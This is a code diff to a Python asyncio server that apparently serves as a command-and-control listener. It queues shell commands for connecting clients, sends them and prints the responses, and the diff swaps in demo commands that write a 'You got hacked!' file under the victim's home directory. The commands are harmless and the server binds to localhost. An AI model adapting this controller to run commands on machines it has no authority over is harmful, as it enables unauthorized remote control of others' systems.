@@ -1,7 +1,6 @@
-import asyncio
-from asyncio import Queue, StreamReader, StreamWriter, TimeoutError, run, wait_for
-import struct
+from asyncio import Queue, StreamReader, StreamWriter, TimeoutError, run, start_server, wait_for
 from datetime import datetime
+import struct
 from typing import Tuple
 
 
@@ -61,10 +60,20 @@ async def _recv_data(reader: StreamReader,
 async def _read(reader: StreamReader,
                 timeout: float = DEFAULT_TIMEOUT) -> bytes:
 
-    # Each message is prepended by 8 bytes representing
+    # Each message is prepended by 4 bytes representing
     # the remaining message length. Assuming little-endian?
-    chunk = await _recv_data(reader, 8, timeout)
-    expected_len = struct.unpack('<Q', chunk)[0]
+    chunk = await _recv_data(reader, 4, timeout)
+    if not chunk:
+        return None
+
+    try:
+        expected_len = struct.unpack('!I', chunk)[0]
+    except struct.error:
+        return None
+
+    # Some commands might not write to stdout, so response can be empty.
+    if expected_len == 0:
+        return b''
 
     # Read stream until <expected_len> bytes.
     return await _recv_data(reader, expected_len, timeout)
@@ -86,30 +95,43 @@ async def _handle(reader: StreamReader,
     print(f'{uuid.hex()} is quacking.')
 
     # Example
-    # dd if=/dev/urandom of=test.file count=1024 bs=1024
     jobs = Queue()
-    jobs.put_nowait(b'cat test.file')
+    jobs.put_nowait(b'mkdir ~/hacked')
+    jobs.put_nowait(b'touch ~/hacked/hacked.txt')
+    jobs.put_nowait(b"echo 'You got hacked!' > ~/hacked/hacked.txt")
+    jobs.put_nowait(b'cat ~/hacked/hacked.txt')
     jobs.put_nowait(b'exit')
 
-    # Send payloads as they are enqueued until "exit" is issued.
+    # Send payloads as they are enqueued.
     while (cmd := await jobs.get()) != b'exit':
-
         await _send(writer, cmd)
+        start = datetime.now()
         response = await _read(reader)
 
-    await _send(writer, cmd)
+        # Some error happened while receiving.
+        if response == None:
+            break
+
+        print(f"\nCommand:\t{cmd.decode('utf-8')}")
+        print(f'Response size:\t{len(response)} bytes')
+        print(f'Response time:\t{datetime.now() - start}\n')
+        if response:
+            print(response.decode('utf-8'))
+    else:
+        await _send(writer, cmd)
+
     writer.close()
 
 
-async def start_server(addr: Tuple[str, int]) -> None:
+async def start(addr: Tuple[str, int]) -> None:
 
-    server = await asyncio.start_server(_handle, *addr)
+    server = await start_server(_handle, *addr)
 
     async with server:
         await server.serve_forever()
 
 
 try:
-    run(start_server(('localhost', 5000)))
+    run(start(('localhost', 5000)))
 except KeyboardInterrupt:
     pass
